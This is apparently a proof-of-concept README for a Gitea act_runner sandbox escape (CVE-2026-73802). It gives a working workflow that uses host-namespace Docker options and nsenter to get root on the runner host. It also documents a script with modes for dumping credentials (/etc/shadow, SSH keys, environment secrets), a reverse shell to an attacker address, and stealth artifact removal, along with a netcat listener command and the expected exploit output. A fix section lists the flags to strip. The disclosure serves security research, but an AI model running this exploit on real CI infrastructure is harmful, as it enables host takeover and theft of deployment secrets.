# CVE-2026-73802 - Sandbox Escape to Host RCE

Detailed Writeup is here : https://sn0xs-organization.gitbook.io/sn0x-order.org/bb-web-hunt/gitea2shell-sandbox-escape-to-host-rce

> **Sandbox Escape to Host RCE: Gitea act_runner container.options Host Namespace Escape**

[![CVE](https://img.shields.io/badge/CVE-2026--73802-critical?style=flat-square&color=red)](https://www.cve.org/CVERecord?id=CVE-2026-73802)
[![GHSA](https://img.shields.io/badge/GHSA-x4q3--gcj3--m6cf-critical?style=flat-square&color=red)](https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf)
[![CVSS](https://img.shields.io/badge/CVSS-9.9%20Critical-critical?style=flat-square&color=darkred)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
[![Fixed](https://img.shields.io/badge/Fixed-runner%20%3E%203.0.0-brightgreen?style=flat-square)](https://gitea.com/gitea/runner/releases)

---

## Overview

Gitea's `act_runner` appends workflow-controlled `jobs.<job>.container.options` directly to Docker's `HostConfig` for the job container without sanitization. When privileged mode is disabled, `sanitizeConfig()` only strips `Binds` and `Mounts` host namespace flags, capability expansion, and security profile overrides pass through untouched.

A workflow author with push access to any repository backed by a shared Docker runner can enter host PID/IPC/mount namespaces and execute arbitrary commands as root on the runner host no runner-level privileged mode required.

---

## Vulnerability Details

| Field | Value |
|---|---|
| **CVE** | CVE-2026-73802 |
| **GHSA** | GHSA-x4q3-gcj3-m6cf |
| **CVSS 3.1** | `9.9 Critical` — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Affected** | `gitea.com/gitea/runner < 3.0.0` |
| **Fixed** | `gitea.com/gitea/runner > 3.0.0` |
| **CWE** | CWE-269 — Improper Privilege Management |
| **Researcher** | [@sn0x-sharma](https://github.com/sn0x-sharma) |
| **Disclosed** | June 28, 2026 |
| **Published** | August 15, 2026 |

---

## Root Cause

### Source-to-Sink Path

```
ContainerSpec.Options          ← workflow YAML: jobs.<job>.container.options
        │
        ▼
RunContext.options()           ← appends workflow options to runner-level options
        │
        ▼
mergeContainerConfigs()        ← parses Docker CLI flags → HostConfig
        │
        ▼
sanitizeConfig()               ← ONLY strips Binds + Mounts
        │
        ▼
Docker HostConfig              ← PidMode=host, IpcMode=host, CapAdd=ALL survive
```

### What survives sanitization

```
Privileged    = false   ✓ (stripped)
Binds         = []      ✓ (stripped)
Mounts        = []      ✓ (stripped)

PidMode       = host    ✗ (NOT stripped)
IpcMode       = host    ✗ (NOT stripped)
CapAdd        = [ALL]   ✗ (NOT stripped)
SecurityOpt   = [seccomp=unconfined, apparmor=unconfined]  ✗ (NOT stripped)
```

---

## Proof of Concept

### Minimal Workflow (manual)

```yaml
jobs:
  escape:
    runs-on: ubuntu-latest
    container:
      image: ubuntu:22.04
      options: >-
        --pid=host --ipc=host --cap-add=ALL
        --security-opt seccomp=unconfined
        --security-opt apparmor=unconfined
    steps:
      - name: host-namespace-escape
        run: |
          nsenter -t 1 -m -u -i -n -p -- sh -c "id; hostname; uname -a"
```

### Automated PoC (`gitea_act_runner_escape.py`)

#### Requirements

```bash
# Python 3.8+, act_runner binary, Docker
pip install -r requirements.txt   # no external deps required
```

#### Usage

```bash
# Check if runner is vulnerable (no exploit)
python3 gitea_act_runner_escape.py --check-only

# Basic escape proof (writes marker to host filesystem)
python3 gitea_act_runner_escape.py

# Credential + secrets dump
# Dumps: /proc/1/environ, /etc/shadow, SSH keys, Docker socket, env vars
python3 gitea_act_runner_escape.py --mode creds

# Reverse shell (start listener first: nc -lvnp 4444)
python3 gitea_act_runner_escape.py --mode revshell --lhost 10.10.10.1 --lport 4444

# Full mode: creds dump + reverse shell callback
python3 gitea_act_runner_escape.py --mode full --lhost 10.10.10.1 --lport 4444

# Stealth run + JSON report
python3 gitea_act_runner_escape.py --mode full --stealth --report /tmp/report.json

# Custom runner binary + image
python3 gitea_act_runner_escape.py --runner /opt/act_runner --image debian:12
```

#### All flags

```
--runner        Path to act_runner binary (default: act_runner)
--image         Container image for job (default: ubuntu:22.04)
--marker        Absolute host path for escape proof file
--workdir       Working directory for generated workflow
--keep-workdir  Keep generated workflow directory after run
--timeout       act_runner exec timeout in seconds (default: 180)
--debug         Pass --debug to act_runner
--pull          Pull container image before run
--stealth       Remove marker and artifacts after verification
--check-only    Version check only, no exploit
--report        Save JSON report to path
--mode          marker | creds | revshell | full
--lhost         Attacker IP for reverse shell
--lport         Attacker port for reverse shell (default: 4444)
```

#### Expected output (marker mode)

```
[*] runner binary  : /usr/local/bin/act_runner
[*] detected version: 2.0.3
[*] status          : VULNERABLE
[+] Docker socket present
[*] mode: marker
[*] workflow written: /tmp/cve-2026-73802-poc-xxxx/.gitea/workflows/poc.yml

[+] ══════════════════════════════════════════
[+]  HOST NAMESPACE ESCAPE CONFIRMED
[+] ══════════════════════════════════════════
CVE-2026-73802-escape-confirmed
---
uid=0(root) gid=0(root) groups=0(root)
runner-host-01
Linux runner-host-01 5.15.0-1040-aws #44-Ubuntu SMP x86_64 GNU/Linux
```

---

## Impact

An attacker who can submit a workflow to a repository using a shared Docker-backed `act_runner` can:

- Enter host **PID**, **IPC**, and **mount** namespaces via `nsenter`
- Execute arbitrary commands as **root** on the runner host
- Read **deployment secrets**, API tokens, and environment variables from `/proc/1/environ`
- Access `/etc/shadow` and **SSH private keys**
- **Pivot** to adjacent jobs running on the same runner
- Reach **internal build infrastructure** accessible from the runner host

**Critical** for shared runners where untrusted users can trigger workflows.  
**High** for single-tenant runners with privileged mode explicitly disabled as a security control.

---

## Fix

**Update to `gitea.com/gitea/runner > 3.0.0`**

PR: https://gitea.com/gitea/runner/pulls/1058

### Fix direction

Treat `container.options` as untrusted input. When privileged mode is disabled, reject or strip:

```
Host namespaces  : --pid=host, --ipc=host, --uts=host, --network=host
Capability expand: --cap-add ALL, --cap-add SYS_ADMIN
Security overrides: --security-opt seccomp=unconfined, --security-opt apparmor=unconfined
Device access    : --device, --device-cgroup-rule
Volume inherit   : --volumes-from
Runtime control  : --runtime, --cgroup-parent
```

---

## References

- [GHSA-x4q3-gcj3-m6cf](https://github.com/go-gitea/gitea/security/advisories/GHSA-x4q3-gcj3-m6cf)
- [Fix PR — gitea/runner#1058](https://gitea.com/gitea/runner/pulls/1058)
- [act_runner releases](https://gitea.com/gitea/runner/releases)
- [OWASP CI/CD Security Top 10 — CICD-SEC-9](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

---

## Disclaimer

This PoC is released for **educational and authorized security research purposes only**. Only run against infrastructure you own or have explicit written permission to test. The author is not responsible for misuse.

---
